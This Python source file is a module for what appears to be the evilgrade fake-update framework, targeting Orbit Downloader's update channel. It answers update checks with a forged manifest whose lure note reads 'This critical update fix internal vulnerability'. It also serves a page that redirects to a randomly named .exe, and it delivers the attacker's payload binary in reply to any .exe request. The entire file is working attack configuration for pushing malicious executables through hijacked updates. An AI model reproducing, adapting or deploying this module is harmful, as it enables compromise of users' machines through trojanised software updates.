from modules import ModuleBase


class Orbit(ModuleBase):
    name = 'Orbit'
    version = '1.0'
    appver = ''
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(obupdate.orbitdownloader.com|www.orbitdownloader.com)'
    options = {
        'description': {
            'val': 'This critical update fix internal vulnerability',
            'desc': 'Description to be displayed during the update'
        },
        'version': {
            'val': 'rand_num(2)',
            'hidden': 1,
            'dynamic': 1,
        },
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [
        {   'path': '/update/',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '[update]\nneed=2\nversion=2.8.1.1\nurl=http://obupdate.orbitdownloader.com/dlup/UpdatePackage2.8.1.exe\nnote=<%DESCRIPTION%>\n',
            'parse': 1,
            'file': '',
        },
        {   'path': 'update.php',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://obupdate.orbitdownloader.com/orbitupdate<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]

